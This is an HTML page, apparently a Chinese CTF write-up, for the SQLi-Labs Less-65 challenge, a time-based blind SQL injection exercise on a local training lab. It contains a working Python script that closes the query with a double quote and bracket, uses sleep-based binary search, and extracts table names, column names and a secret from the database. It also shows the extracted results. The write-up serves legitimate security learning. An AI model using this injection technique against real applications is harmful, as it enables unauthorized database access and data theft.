@@ -1,0 +1,124 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>【SQLi-Labs】Less-65 Challenge-12 双引号括号时间盲注 Writeup</title>
+    <style>
+        body { font-family: sans-serif; line-height: 1.8; max-width: 800px; margin: 0 auto; padding: 20px; color: #333; background-color: #fcfcfc; }
+        h1 { border-bottom: 2px solid #0366d6; padding-bottom: .3em; color: #0366d6; }
+        h2 { border-bottom: 1px solid #eaecef; padding-bottom: .3em; margin-top: 30px; color: #24292e; }
+        code { background-color: #f6f8fa; padding: 0.2em 0.4em; border-radius: 6px; font-family: monospace; color: #d73a49; }
+        pre { background-color: #f6f8fa; padding: 16px; border-radius: 6px; overflow: auto; font-family: monospace; }
+        .meta { color: #586069; font-size: 0.95em; margin-bottom: 20px; border-bottom: 1px dashed #eaecef; padding-bottom: 10px; }
+        .footer { margin-top: 50px; font-size: 0.9em; color: #586069; border-top: 1px solid #eaecef; padding-top: 10px; text-align: center; }
+        ul, ol { padding-left: 20px; }
+    </style>
+</head>
+<body>
+    <p><a href="index.html">← 返回首页</a></p>
+    <h1>【SQLi-Labs】Less-65 Challenge-12 双引号括号时间盲注 Writeup</h1>
+    
+    <div class="meta">
+        <p><strong>操作者：</strong>何芊宏 | <strong>操作日期：</strong>2026.10.29 | <strong>分类：</strong>CTF | <strong>标签：</strong>SQLi-Labs, Web, SQL注入, 时间盲注, Python自动化, Challenge</p>
+    </div>
+    
+    <h2>1. 题目信息</h2>
+    <ul>
+        <li><strong>平台：</strong>SQLi-Labs (本地 phpStudy 环境)</li>
+        <li><strong>分类：</strong>Web - SQL注入 Challenge 系列（最终关）</li>
+        <li><strong>题目名称：</strong>Less-65 (Challenge-12)</li>
+        <li><strong>提示：</strong>目标是从 <code>challenges</code> 库中提取密钥，限制 130 次尝试。无报错、无回显，闭合符为双引号加括号 <code>")</code>。</li>
+    </ul>
+
+    <h2>2. 核心原理与前置分析</h2>
+    <p>本关卡是 Challenge 系列的最后一关，机制与 L64 相同，属于纯时间盲注环境。</p>
+    <p><strong>核心区别：</strong>闭合上下文变为 <code>id=("$id")</code>。构造 Payload 时需使用 <code>")</code> 闭合。继续沿用二分法盲注脚本，并为了适配双引号闭合，在 Python 中采用外层单引号包裹 f-string 的形式避免语法冲突。</p>
+
+    <h2>3. 操作步骤与代码解析</h2>
+    
+    <p><strong>第一步：编写并运行最终版 Python 脚本</strong></p>
+    <p>新建 <code>final_65.py</code>，核心逻辑如下：</p>
+
+    <pre><code>import requests
+import time
+
+url = "http://localhost/sqli-labs-master/Less-65/"
+delay_threshold = 1.5 
+
+def check_true(payload):
+    # 核心变化：双引号加括号闭合（外层用单引号包裹）
+    full_url = f'{url}?id=1") and ({payload})--+'
+    try:
+        start = time.time()
+        requests.get(full_url, timeout=10)
+        return (time.time() - start) &gt; delay_threshold
+    except requests.exceptions.Timeout:
+        return True
+
+def get_char(expr, pos):
+    low = 32
+    high = 126
+    while low &lt;= high:
+        mid = (low + high) // 2
+        payload = f"if(ascii(substr({expr},{pos},1))&gt;{mid},sleep(2),0)"
+        if check_true(payload):
+            low = mid + 1
+        else:
+            high = mid - 1
+    return low
+
+def extract(expr, length):
+    result = ""
+    for i in range(1, length + 1):
+        code = get_char(expr, i)
+        if code &lt;= 32 or code &gt; 126:
+            break
+        result += chr(code)
+        print(f"\r[*] 当前结果: {result}", end="", flush=True)
+    print()
+    return result
+
+if __name__ == "__main__":
+    print("[*] 开始 L65 时间盲注二分法提取（最后一关）...")
+    
+    print("[*] 正在提取表名...")
+    table = extract("(select table_name from information_schema.tables where table_schema='challenges' limit 1)", 12)
+    print(f"[+] 表名: {table}")
+    
+    print("[*] 正在提取密钥列名...")
+    col = extract("(select column_name from information_schema.columns where table_schema='challenges' and column_name like 'secret%' limit 1)", 16)
+    print(f"[+] 列名: {col}")
+    
+    print("[*] 正在提取最终密钥...")
+    secret = extract(f"(select {col} from challenges.{table} limit 1)", 24)
+    print(f"[+] 最终密钥: {secret}")</code></pre>
+
+    <p><strong>代码成分解析：</strong></p>
+    <ul>
+        <li><code>full_url = f'{url}?id=1") and ({payload})--+'</code>：精准匹配 L65 的双引号+括号闭合上下文。</li>
+        <li><strong>时间差判定：</strong>利用 <code>time.time()</code> 计算请求耗时，大于 1.5 秒判定条件成立（True），有效过滤网络抖动。</li>
+        <li><strong>二分法循环：</strong>在 ASCII 码 32-126 范围内不断折半，快速逼近目标字符。</li>
+    </ul>
+
+    <p><strong>第二步：执行结果与提交</strong></p>
+    <p>终端成功输出：表名 <code>zngrvvatv6</code>，列名 <code>secret_MWPS</code>，最终密钥 <code>EKQCHG7RngIdNZ25NATJnrm0</code>。</p>
+    <p>将最终密钥提交至页面底部输入框，页面弹出 <code>CONGRATS YOU NAILED IT</code>，通关成功。</p>
+
+    <h2>4. 策略复盘</h2>
+    <ul>
+        <li><strong>闭环的自动化：</strong>时间盲注本质是“暴力穷举”，在限制 130 次尝试的环境下，盲目手工测试必然失败。以脚本驱动二分法，是唯一解。</li>
+        <li><strong>引号逃逸：</strong>在 Python 脚本中拼接带双引号的 SQL 语句时，必须灵活切换字符串的引号包裹方式，或使用转义符，避免产生语法错误。</li>
+    </ul>
+
+    <h2>5. 知识点总结</h2>
+    <ul>
+        <li><strong>时间盲注综合应用</strong>：结合闭合逃逸、睡眠函数、二分算法与 HTTP 请求延时分析。</li>
+        <li><strong>自动化脚本工程化</strong>：通过封装提取函数（<code>extract</code>）和字符推断函数（<code>get_char</code>），实现代码的高复用性。</li>
+    </ul>
+
+    <div class="footer">
+        <p>Hosted on GitHub Pages</p>
+    </div>
+</body>
+</html>
